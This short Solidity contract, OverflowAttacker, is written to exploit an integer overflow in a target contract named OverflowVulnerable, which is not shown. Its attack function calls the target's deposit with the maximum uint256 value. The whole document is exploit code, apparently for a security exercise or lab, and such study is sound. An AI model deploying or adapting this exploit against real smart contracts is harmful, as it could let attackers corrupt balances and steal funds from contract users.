contract OverflowAttacker {
    OverflowVulnerable public target;
    address public owner;

    constructor(address _target) {
        target = OverflowVulnerable(_target);
        owner = msg.sender;
    }

    function attack() public {
        uint256 max = type(uint256).max;
        target.deposit(max);
    }
}